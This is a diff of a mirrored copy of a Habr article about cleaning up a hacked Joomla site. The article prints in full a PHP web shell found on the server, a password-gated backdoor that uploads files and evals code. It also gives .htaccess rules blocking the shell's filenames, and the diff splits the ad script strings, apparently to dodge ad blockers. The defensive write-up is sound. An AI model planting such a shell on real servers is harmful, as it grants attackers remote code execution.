@@ -27,12 +27,12 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
 
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
   <script>
-       (adsbygoogle = window.adsbygoogle || []).push({
-            google_ad_client: "ca-pub-6974184241884155",
-            enable_page_level_ads: true
-       });
+        var superSpecialObject = {};
+        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
+        superSpecialObject['enable_page_level_a' + 'ds'] = true;
+       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
   </script>
 </head>
 
@@ -54,7 +54,7 @@
   <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
   <section class="page js-page"><h1>Quick fix hacked site</h1><div class="post__text post__text-html js-mediator-article"> Good day. <br><br>  Today I ran into the problem of hacking the Joomla site, I want to share one of the methods that helped solve the problem. <br>  I want to say that the solution is not specific to Joomla and most likely will help in other cases. <br><br>  If you find that your FTP has a bunch of weird files with names <br>  lib __ *, co __ *, pre __ *, net __ *, func __ *, ad __ *, ext __ *, new __ *, old __ *, fix __ *, fixed __ *, na __ *, av __ *, fx __ *, update __ *, patch__ <br><a name="habracut"></a><br>  Where * is one of the file names that are in this directory, and its contents are very similar to this: <br><pre> <code class="hljs perl">&lt;?php <br> @error_reporting(E_ALL); <br> @set_time_limit(<span class="hljs-number"><span class="hljs-number">0</span></span>); <br> global $HTTP_SERVER_VARS; <br> <br> define(<span class="hljs-string"><span class="hljs-string">'PASSWD'</span></span>,<span class="hljs-string"><span class="hljs-string">'8487929db643f81df2d8a2bcfd173348'</span></span>); <br> <br> function <span class="hljs-keyword"><span class="hljs-keyword">say</span></span>($t) { <br> echo <span class="hljs-string"><span class="hljs-string">"$t\n"</span></span>; <br> }; <br> <br> function testdata($t) { <br> <span class="hljs-keyword"><span class="hljs-keyword">say</span></span>(md5(<span class="hljs-string"><span class="hljs-string">"mark_$t"</span></span>)); <br> }; <br> <br> echo <span class="hljs-string"><span class="hljs-string">""</span></span>; testdata(<span class="hljs-string"><span class="hljs-string">'start'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (md5($_POST[<span class="hljs-string"><span class="hljs-string">"p"</span></span>]) == PASSWD) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($code = @fread(@fopen($HTTP_POST_FILES[<span class="hljs-string"><span class="hljs-string">"s"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], <span class="hljs-string"><span class="hljs-string">"rb"</span></span>), $HTTP_POST_FILES[<span class="hljs-string"><span class="hljs-string">"s"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@fwrite(@fopen(dirname(__FILE_<span class="hljs-number"><span class="hljs-number">_</span></span>).<span class="hljs-string"><span class="hljs-string">'/'</span></span>.basename($HTTP_POST_FILES[<span class="hljs-string"><span class="hljs-string">"s"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]), <span class="hljs-string"><span class="hljs-string">"wb"</span></span>), $code)) { testdata(<span class="hljs-string"><span class="hljs-string">'save_ok'</span></span>); }; <span class="hljs-regexp"><span class="hljs-regexp">//eval</span></span>($code); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { testdata(<span class="hljs-string"><span class="hljs-string">'save_fail'</span></span>); }; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($code = @fread(@fopen($HTTP_POST_FILES[<span class="hljs-string"><span class="hljs-string">"f"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], <span class="hljs-string"><span class="hljs-string">"rb"</span></span>), $HTTP_POST_FILES[<span class="hljs-string"><span class="hljs-string">"f"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($code); testdata(<span class="hljs-string"><span class="hljs-string">'ok'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { testdata(<span class="hljs-string"><span class="hljs-string">'fail'</span></span>); }; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { testdata(<span class="hljs-string"><span class="hljs-string">'pass'</span></span>); }; testdata(<span class="hljs-string"><span class="hljs-string">'end'</span></span>); echo <span class="hljs-string"><span class="hljs-string">" "</span></span>; <br> ?&gt;</code> </pre> <code>&lt;?php <br> @error_reporting(E_ALL); <br> @set_time_limit(0); <br> global $HTTP_SERVER_VARS; <br> <br> define('PASSWD','8487929db643f81df2d8a2bcfd173348'); <br> <br> function say($t) { <br> echo "$t\n"; <br> }; <br> <br> function testdata($t) { <br> say(md5("mark_$t")); <br> }; <br> <br> echo ""; testdata('start'); if (md5($_POST["p"]) == PASSWD) { if ($code = @fread(@fopen($HTTP_POST_FILES["s"]["tmp_name"], "rb"), $HTTP_POST_FILES["s"]["size"])) { if(@fwrite(@fopen(dirname(__FILE__).'/'.basename($HTTP_POST_FILES["s"]["name"]), "wb"), $code)) { testdata('save_ok'); }; //eval($code); } else { testdata('save_fail'); }; if ($code = @fread(@fopen($HTTP_POST_FILES["f"]["tmp_name"], "rb"), $HTTP_POST_FILES["f"]["size"])) { eval($code); testdata('ok'); } else { testdata('fail'); }; } else { testdata('pass'); }; testdata('end'); echo " "; <br> ?&gt;</code> <br> <br>  Your site was hacked and uploaded to it because  called shell. <br>  As long as you figure out what's what, the easiest file to neutralize them is to add the following lines to .htaccess (add): 
       <br>
-        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"></script>')</script>
         <ins class="adsbygoogle"
           style="display:block; text-align:center;"
           data-ad-layout="in-article"
@@ -62,23 +62,23 @@
           data-ad-client="ca-pub-6974184241884155"
           data-ad-slot="8945601208"></ins>
         <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
+          (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push({});
         </script>
       <br>
-     <code>&lt;FilesMatch "^(lib|co|pre|net|func|ad|ext|new|old|fix|fixed|na|av|fx|update|patch)__.*?\.php"&gt; <br> Order allow,deny <br> Deny from all <br></code> <br><br>  &lt;FilesMatch "^ offlline \ .php $"&gt; <br>  Order allow, deny <br>  Deny from all <br><br><br><br>  The files will be neutralized, but I do not recommend to be limited only to this, since  This is a consequence of at least 2 problems: <br>  1. You have a hole through which it all crawled. <br>  2. Somewhere there is a file that spreads all this.  And if you do not take action, then through it will be able to fill in other modifications. <br>  3. A very big suspicion that this reduces the speed of the web server. </div><p>Source: <a href="https://habr.com/ru/post/66702/">https://habr.com/ru/post/66702/</a></p>
+     <code>&lt;FilesMatch "^(lib|co|pre|net|func|ad|ext|new|old|fix|fixed|na|av|fx|update|patch)__.*?\.php"&gt; <br> Order allow,deny <br> Deny from all <br></code> <br><br>  &lt;FilesMatch "^ offlline \ .php $"&gt; <br>  Order allow, deny <br>  Deny from all <br><br><br><br>  The files will be neutralized, but I do not recommend to be limited only to this, since  This is a consequence of at least 2 problems: <br>  1. You have a hole through which it all crawled. <br>  2. Somewhere there is a file that spreads all this.  And if you do not take action, then through it will be able to fill in other modifications. <br>  3. A very big suspicion that this reduces the speed of the web server. </div><p>Source: https://habr.com/ru/post/66702/</p>
 <section class="more-articles-navigation-panel js-more-articles-navigation-panel">
 <h4>More articles:</h4>
 <nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
-<li><a href="../66687/index.html">"Apple Museum" or "Hello! We need you! ”</a></li>
 <li><a href="../66691/index.html">Funny hack (crossed out) deception of my brain</a></li>
 <li><a href="../66695/index.html">Help improve Wikipedia usability</a></li>
+<li><a href="../667/index.html">And sometimes it happens that way ... :)</a></li>
 <li><a href="../66700/index.html">YouSticker.com - Glue your mind</a></li>
 <li><a href="../66701/index.html">Govnokod.ru 2.0</a></li>
 <li><a href="../66704/index.html">Toshiba officially switches to Blu-ray</a></li>
 <li><a href="../66708/index.html">Google Map of Kharkov and Wikimapia</a></li>
+<li><a href="../6671/index.html">Web 2.0 directory</a></li>
 <li><a href="../66710/index.html">Typograph (plugin for FCK editor)</a></li>
 <li><a href="../66714/index.html">Stealth NW-2000 - secure laptop with swivel screen</a></li>
-<li><a href="../66716/index.html">Toshiba T3200 Notebook</a></li>
 </ul></nav>
 </section><br />
 <a href="../../allArticles.html"><strong>All Articles</strong></a>
